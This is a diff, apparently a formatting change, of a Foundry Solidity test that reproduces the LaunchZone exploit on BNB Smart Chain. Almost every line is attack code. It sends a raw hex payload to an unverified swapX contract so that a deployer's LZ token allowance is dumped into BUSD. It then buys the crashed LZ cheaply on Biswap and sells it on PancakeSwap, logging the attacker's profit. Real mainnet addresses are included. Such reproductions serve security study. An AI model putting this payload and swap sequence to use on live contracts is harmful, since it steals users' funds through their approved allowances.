@@ -17,12 +17,7 @@ import "forge-std/Test.sol";
 // https://bscscan.com/address/0x1c2b102f22c08694eee5b1f45e7973b6eaca3e92  attacker contract
 
 interface UniRouterLike {
-    function swap(
-        uint256 amount0Out,
-        uint256 amount1Out,
-        address to,
-        bytes calldata data
-    ) external;
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
 
     function swapExactTokensForTokens(
         uint256 amountIn,
@@ -32,10 +27,10 @@ interface UniRouterLike {
         uint256 deadline
     ) external returns (uint256[] memory amounts);
 
-    function getAmountsOut(uint256 amountIn, address[] calldata path)
-        external
-        view
-        returns (uint256[] memory amounts);
+    function getAmountsOut(
+        uint256 amountIn,
+        address[] calldata path
+    ) external view returns (uint256[] memory amounts);
 }
 
 interface ERC20Like {
@@ -45,16 +40,9 @@ interface ERC20Like {
 
     function approve(address spender, uint256 amount) external returns (bool);
 
-    function transferFrom(
-        address from,
-        address to,
-        uint256 amount
-    ) external returns (bool);
+    function transferFrom(address from, address to, uint256 amount) external returns (bool);
 
-    function allowance(address owner, address spender)
-        external
-        view
-        returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
 }
 
 contract LaunchZoneExploit is Test {
@@ -64,8 +52,7 @@ contract LaunchZoneExploit is Test {
     UniRouterLike BISWAPRouter;
     UniRouterLike pancackeRouter;
 
-    address immutable BscexDeployer =
-        0xdad254728A37D1E80C21AFae688C64d0383cc307;
+    address immutable BscexDeployer = 0xdad254728A37D1E80C21AFae688C64d0383cc307;
     address immutable attacker = 0x1C2B102f22c08694EEe5B1f45E7973b6EACA3e92;
 
     address immutable swapXImp = 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01; // unverified
@@ -76,12 +63,8 @@ contract LaunchZoneExploit is Test {
         LZ = ERC20Like(0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2);
         BUSD = ERC20Like(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
         BISWAPPair = ERC20Like(0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593);
-        BISWAPRouter = UniRouterLike(
-            0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8
-        );
-        pancackeRouter = UniRouterLike(
-            0x10ED43C718714eb63d5aA57B78B54704E256024E
-        );
+        BISWAPRouter = UniRouterLike(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);
+        pancackeRouter = UniRouterLike(0x10ED43C718714eb63d5aA57B78B54704E256024E);
 
         vm.label(BscexDeployer, "BscexDeployer");
 
@@ -97,34 +80,25 @@ contract LaunchZoneExploit is Test {
         console.log("Running on BSC at : ", block.number);
 
         console.log("BscexDeployer LZ Balalnce", LZ.balanceOf(BscexDeployer));
-        console.log(
-            "LZ allowance to swapXImp",
-            LZ.allowance(BscexDeployer, swapXImp) / 1e18
-        );
+        console.log("LZ allowance to swapXImp", LZ.allowance(BscexDeployer, swapXImp) / 1e18);
 
         //  lazy payload check the previous swapX PoC
         //  swapX.call(abi.encodeWithSelector(0x4f1f05bc, swapPath, transferAmount, value, array, victims[i]));
         //  calling unverified contract of swapXImp with payload containing swap
         //  (bool success, bytes memory returndata) = swapXImpl.call{value: msg.value}(data);
 
-        bytes
-            memory payload = hex"4f1f05bc00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
-        (bool success, ) = address(swapXImp).call(payload);
+        bytes memory payload =
+            hex"4f1f05bc00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000082da53fc059357f82f9b400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000dad254728a37d1e80c21afae688c64d0383cc30700000000000000000000000000000000000000000000000000000000000000020000000000000000000000003b78458981eb7260d1f781cb8be2caac7027dbe2000000000000000000000000e9e7cea3dedca5984780bafc599bd69add087d5600000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
+        (bool success,) = address(swapXImp).call(payload);
         console.log("Payload delivered", success);
 
-        console.log(
-            "BscexDeployer BUSD Balalnce",
-            BUSD.balanceOf(BscexDeployer) / 1e18
-        );
+        console.log("BscexDeployer BUSD Balalnce", BUSD.balanceOf(BscexDeployer) / 1e18);
 
         // give attacker 50 BUSD
         deal(address(BUSD), address(this), 50 * 1e18);
 
         // get BUSD from attacker
-        console.log(
-            "attacker BUSD Balalnce",
-            BUSD.balanceOf(address(this)) / 1e18
-        );
+        console.log("attacker BUSD Balalnce", BUSD.balanceOf(address(this)) / 1e18);
 
         // approve router for 50 BUSD
         BUSD.approve(address(BISWAPRouter), 50 * 1e18);
@@ -139,21 +113,12 @@ contract LaunchZoneExploit is Test {
         console.log("amounts BUSD/LZ", amounts[0] / 1e18, amounts[1] / 1e18);
 
         // do the swap
-        BISWAPRouter.swapExactTokensForTokens(
-            amounts[0],
-            amounts[1],
-            path,
-            address(this),
-            block.timestamp
-        );
+        BISWAPRouter.swapExactTokensForTokens(amounts[0], amounts[1], path, address(this), block.timestamp);
 
         // at this point attack has 9_886_999 for 50 BUSD
         console.log("attacker LZ Balalnce", LZ.balanceOf(address(this)) / 1e18);
 
-        console.log(
-            "attacker BUSD Balalnce",
-            BUSD.balanceOf(address(this)) / 1e18
-        );
+        console.log("attacker BUSD Balalnce", BUSD.balanceOf(address(this)) / 1e18);
 
         // reverse swap on pancake
         // building a  new path
@@ -162,10 +127,7 @@ contract LaunchZoneExploit is Test {
         path2[1] = address(BUSD);
 
         // get amount out for LZ to BUSD from pancackeRouter
-        uint256[] memory amounts2 = pancackeRouter.getAmountsOut(
-            LZ.balanceOf(address(this)),
-            path2
-        );
+        uint256[] memory amounts2 = pancackeRouter.getAmountsOut(LZ.balanceOf(address(this)), path2);
 
         console.log("amounts LZ/BUSD", amounts2[0] / 1e18, amounts2[1] / 1e18);
 
@@ -174,17 +136,8 @@ contract LaunchZoneExploit is Test {
         LZ.approve(address(pancackeRouter), LZ.balanceOf(address(this)));
 
         // do the swap
-        pancackeRouter.swapExactTokensForTokens(
-            amounts2[0],
-            amounts2[1],
-            path2,
-            address(this),
-            block.timestamp
-        );
+        pancackeRouter.swapExactTokensForTokens(amounts2[0], amounts2[1], path2, address(this), block.timestamp);
         // check current BSUSD balance
-        console.log(
-            "attacker BUSD Balalnce",
-            BUSD.balanceOf(address(this)) / 1e18
-        );
+        console.log("attacker BUSD Balalnce", BUSD.balanceOf(address(this)) / 1e18);
     }
 }
